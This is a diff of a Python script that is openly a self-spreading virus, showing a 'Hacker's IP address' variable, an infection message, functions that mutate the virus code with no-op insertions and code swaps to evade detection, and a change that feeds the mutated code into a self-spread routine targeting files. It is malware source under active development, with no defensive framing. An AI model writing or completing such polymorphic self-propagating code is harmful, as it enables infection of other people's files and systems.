@@ -8,6 +8,7 @@ import subprocess
 import glob
 import os
 import random
+import io
 
 # ----------- Variables -----------
 host = '127.0.0.1' #Hacker's IP address as a string
@@ -31,15 +32,6 @@ def post_infection_msg(target_os, infection_msg):
         subprocess.run(['notify-send', msg_box_title, infection_msg])
 
 # -- Self Spread Functions --
-
-# def create_executable(code):
-#     try:
-#         # Compile the code (parsed as a string) into a code object
-#         code_obj = compile(code, '<string>', 'exec')
-#     except Exception as e:
-        
-
-        
 
 def is_end(line):
     return True if "# END OF SCRIPT" in line and (len(line.strip()) == len("# END OF SCRIPT")) else False 
@@ -135,7 +127,7 @@ def mutate_with_substitutions(code, substitutions):
 function: mutate_with_nop
 
 Insert a "no-operation" equivalent statement in code. This is done using 
-commands such as `pass` or unnecessary variable assignments. 
+commands such as pass or unnecessary variable assignments. 
 """
 #TODO: If working implement ways to prepend lines too.
 #TODO: If prepend and append are working, integrate number number generator to prepend
@@ -218,11 +210,13 @@ post_infection_msg(target_os, infection_message)
 virus = retrieve_code()
 virus = mutate_with_nop(virus)
 virus = swap_code(virus)
-print(''.join(virus))
+
+# exec_code = compile(''.join(virus), '<string>', 'exec')
+# print(f"  Co_code (bytecode): {exec_code.co_code}")
 
 
 # (6) Perform Self Spread
-spread_self(target_file_type, 164)
+spread_self(target_file_type, ''.join(virus))
 
 
 
